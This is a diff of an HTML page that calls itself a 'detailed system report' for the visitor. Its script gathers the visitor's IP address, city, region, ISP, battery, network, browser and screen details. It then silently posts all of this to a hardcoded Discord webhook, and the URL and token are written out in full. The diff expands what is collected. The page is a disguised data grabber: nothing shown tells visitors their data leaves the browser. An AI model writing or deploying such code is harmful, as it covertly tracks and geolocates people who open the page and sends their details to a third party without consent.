@@ -1,34 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Just Checking Stuff</title>
+  <title>Advanced Device Snapshot</title>
 </head>
 <body>
-  <h1>Gathering fun facts about your setup...</h1>
+  <h1>Creating a detailed system report...</h1>
   <script>
     async function getIPInfo() {
       try {
         const res = await fetch("https://ipapi.co/json/");
-        if (!res.ok) throw new Error("Failed to fetch IP info");
         return await res.json();
-      } catch (err) {
-        console.error("IP fetch error:", err);
-        return { ip: "Unavailable", city: "", region: "", country_name: "" };
+      } catch {
+        return {};
       }
     }
 
+    function getBatteryInfo() {
+      return navigator.getBattery?.().then(battery => ({
+        "🔋 Battery Level": `${Math.round(battery.level * 100)}%`,
+        "🔌 Charging": battery.charging ? "Yes" : "No"
+      })) || Promise.resolve({});
+    }
+
+    function getConnectionInfo() {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+      return {
+        "📶 Connection Type": conn.effectiveType || "Unknown",
+        "⏱️ Downlink (Mbps)": conn.downlink || "Unknown",
+        "⏳ RTT (ms)": conn.rtt || "Unknown"
+      };
+    }
+
+    function getBasicInfo() {
+      return {
+        "🖥️ Platform": navigator.platform,
+        "🧭 Browser": navigator.userAgent,
+        "🗺️ Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+        "📺 Screen Resolution": `${window.screen.width}x${window.screen.height}`,
+        "🔄 Orientation": screen.orientation?.type || "Unknown",
+        "🌐 Online": navigator.onLine ? "Yes" : "No",
+        "👀 Page Visible": document.visibilityState,
+        "🧠 RAM Estimate": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable"
+      };
+    }
+
     async function sendDeviceInfo() {
-      const ipInfo = await getIPInfo();
+      const [ipInfo, batteryInfo] = await Promise.all([
+        getIPInfo(),
+        getBatteryInfo()
+      ]);
 
       const info = {
-        "🌍 IP Address": ipInfo.ip,
-        "📍 Location": `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}`,
-        "🖥️ OS/Platform": navigator.platform,
-        "🌐 Browser": navigator.userAgent,
-        "🗣️ Language": navigator.language,
-        "🕒 Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-        "📶 Online": navigator.onLine ? "Yes" : "No",
-        "📺 Screen": `${window.screen.width}x${window.screen.height} (${screen.orientation?.type || "unknown"})`
+        "🌐 IP Address": ipInfo.ip || "Unavailable",
+        "📍 Location": `${ipInfo.city || "?"}, ${ipInfo.region || "?"}, ${ipInfo.country_name || "?"}`,
+        "🏢 ISP": ipInfo.org || "Unavailable",
+        ...getBasicInfo(),
+        ...getConnectionInfo(),
+        ...batteryInfo,
+        "📅 Timestamp": new Date().toLocaleString()
       };
 
       const webhookUrl = "https://discord.com/api/webhooks/1369355364872753205/KwNFy1fIc4A1ov45CM3d1GI6tkaug4x01gTesPwbWPkCfN9zBF9VzYsSR-stp1cRmY_9";
@@ -38,27 +67,25 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            username: "Device Inspector 😎",
+            username: "🔧 Device Snapshot Pro",
             avatar_url: "https://i.imgur.com/AfFp7pu.png",
             embeds: [{
-              title: "🔍 Here's what I found!",
-              description: "Just checking in with some cool facts about your setup!",
-              color: 0x3498db, // Nice blue
+              title: "🧠 Detailed System Report",
+              description: "Here’s your real-time system snapshot with enhanced precision.",
+              color: 0x00b894,
               fields: Object.entries(info).map(([name, value]) => ({
                 name,
                 value: String(value),
                 inline: false
               })),
-              footer: {
-                text: "All systems look good 🚀"
-              },
+              footer: { text: "Collected in-browser with JavaScript 🧪" },
               timestamp: new Date().toISOString()
             }]
           })
         });
-        console.log("Info sent to Discord webhook.");
-      } catch (error) {
-        console.error("Failed to send data:", error);
+        console.log("Detailed info sent to webhook.");
+      } catch (err) {
+        console.error("Webhook send failed:", err);
       }
     }
 
